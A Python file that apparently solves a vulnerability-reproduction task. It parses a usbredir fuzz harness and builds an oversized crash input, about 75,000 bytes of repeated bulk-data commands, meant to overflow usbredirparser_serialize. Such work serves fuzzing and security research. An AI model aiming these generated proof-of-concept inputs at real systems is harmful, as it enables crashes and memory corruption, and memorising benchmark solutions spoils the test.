import sys
import os
import tarfile
import tempfile
import re
import struct
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        temp_dir = tempfile.mkdtemp()
        try:
            # Handle source extraction
            search_root = temp_dir
            if os.path.isfile(src_path):
                if any(src_path.endswith(ext) for ext in ['.tar.gz', '.tgz', '.tar.xz', '.tar']):
                    try:
                        with tarfile.open(src_path, "r:*") as tar:
                            tar.extractall(path=temp_dir)
                    except:
                        pass
                else:
                    pass
            elif os.path.isdir(src_path):
                search_root = src_path

            # Locate the fuzzer source file
            fuzz_content = None
            
            # Priority: File containing 'usbredirparser_serialize' and 'LLVMFuzzerTestOneInput'
            for root, dirs, files in os.walk(search_root):
                for f in files:
                    if f.endswith(('.c', '.cc', '.cpp')):
                        path = os.path.join(root, f)
                        try:
                            with open(path, 'r', encoding='utf-8', errors='ignore') as fd:
                                content = fd.read()
                                if "LLVMFuzzerTestOneInput" in content and "usbredirparser_serialize" in content:
                                    fuzz_content = content
                                    break
                        except:
                            continue
                if fuzz_content: break
            
            # Fallback: Any fuzzer
            if not fuzz_content:
                for root, dirs, files in os.walk(search_root):
                    for f in files:
                        if f.endswith(('.c', '.cc', '.cpp')):
                            path = os.path.join(root, f)
                            try:
                                with open(path, 'r', encoding='utf-8', errors='ignore') as fd:
                                    content = fd.read()
                                    if "LLVMFuzzerTestOneInput" in content:
                                        fuzz_content = content
                                        break
                            except:
                                continue
                    if fuzz_content: break

            if not fuzz_content:
                return b"A" * 72000

            # Parse command structure from source
            case_blocks = {} # map case_val -> block_content
            
            # Find start of switch
            # Heuristic: split by "case " and try to parse the value
            # This handles nested braces poorly but is robust enough for simple fuzzers
            
            tokens = re.split(r'case\s+((?:0x)?[0-9a-fA-F]+)\s*:', fuzz_content)
            # tokens[0] is pre-switch, tokens[1] is val, tokens[2] is content, tokens[3] is val...
            
            # Skip 0
            for i in range(1, len(tokens), 2):
                if i+1 >= len(tokens): break
                try:
                    val = int(tokens[i], 0)
                    block = tokens[i+1]
                    # Cut block at 'break;' or next 'case' (which is implicit by split)
                    # But split consumes the 'case', so block goes until end of file usually?
                    # No, re.split gives the text between matches. 
                    # So tokens[i+1] is the text *before* the next case.
                    # We just need to stop at break; inside it.
                    if "break;" in block:
                        block = block.split("break;")[0]
                    case_blocks[val] = block
                except:
                    continue

            # Analyze blocks to find best command
            target_cmd = None
            target_params = [] # List of (type, size)
            is_variable_data = False
            
            # We prefer commands that send variable data (bulk, control, iso)
            candidates = []
            
            for cmd, block in case_blocks.items():
                if "usbredirparser_send_" in block:
                    score = 0
                    if "bulk" in block: score += 10
                    if "control" in block: score += 5
                    if "iso" in block: score += 5
                    
                    # Analyze parameters consumption
                    # Look for ConsumeIntegral<T>()
                    params = []
                    has_data = False
                    
                    # regex to find consumes in order
                    # simplistic: find all matches
                    # Note: We need order. 
                    consumes = re.findall(r'(ConsumeIntegral<([^>]+)>|ConsumeBytes|ConsumeRemainingBytes)', block)
                    
                    for c in consumes:
                        full_str = c[0]
                        type_str = c[1] if len(c) > 1 else ""
                        
                        if "ConsumeIntegral" in full_str:
                            sz = 1
                            if "uint16" in type_str or "short" in type_str: sz = 2
                            elif "uint32" in type_str or "int" in type_str: sz = 4
                            elif "uint64" in type_str: sz = 8
                            params.append(('int', sz))
                        elif "ConsumeBytes" in full_str or "ConsumeRemainingBytes" in full_str:
                            has_data = True
                            params.append(('data', 0))
                    
                    if has_data: score += 20
                    candidates.append((score, cmd, params, has_data))
            
            # Sort candidates
            candidates.sort(key=lambda x: x[0], reverse=True)
            
            if candidates:
                _, target_cmd, target_params, is_variable_data = candidates[0]
            else:
                # Fallback: First case found?
                if case_blocks:
                    target_cmd = list(case_blocks.keys())[0]
                    target_params = []
                    is_variable_data = False

            # Generate PoC
            poc = bytearray()
            total_size_needed = 75000 # > 71298
            
            if target_cmd is None:
                # Blind fallback
                return b"A" * 72000

            # Loop to fill buffer
            while len(poc) < total_size_needed:
                poc.append(target_cmd)
                
                # Append params
                data_param_idx = -1
                
                # Check which param is data
                for idx, (ptype, psize) in enumerate(target_params):
                    if ptype == 'data':
                        data_param_idx = idx
                        break
                
                # We need to construct params. 
                # If there is a data param, we want to maximize it within chunk limits.
                # Chunk limit: let's use 4KB chunks to be safe with protocol limits
                chunk_len = 4096
                
                # If we have a 'size' parameter that controls data length, we must set it.
                # Heuristic: the 'int' param immediately preceding 'data' is likely the length.
                len_param_idx = -1
                if data_param_idx > 0:
                    if target_params[data_param_idx-1][0] == 'int':
                        len_param_idx = data_param_idx - 1
                
                for i, (ptype, psize) in enumerate(target_params):
                    if i == len_param_idx:
                        # Write length
                        if psize == 1: poc.append(chunk_len & 0xFF) # unlikely
                        elif psize == 2: poc.extend(struct.pack('<H', chunk_len if chunk_len < 65535 else 65535))
                        elif psize == 4: poc.extend(struct.pack('<I', chunk_len))
                    elif i == data_param_idx:
                        # Write data
                        poc.extend(b'X' * chunk_len)
                    else:
                        # Other integer params (ep, status, etc) -> 0
                        poc.extend(b'\x00' * psize)
                
                # If no parameters detected (e.g. fixed struct via fixed calls), add padding
                if not target_params:
                    # Guess some padding
                    poc.extend(b'\x00' * 64)
            
            return bytes(poc)

        except Exception:
            return b"A" * 72000
        finally:
            shutil.rmtree(temp_dir)
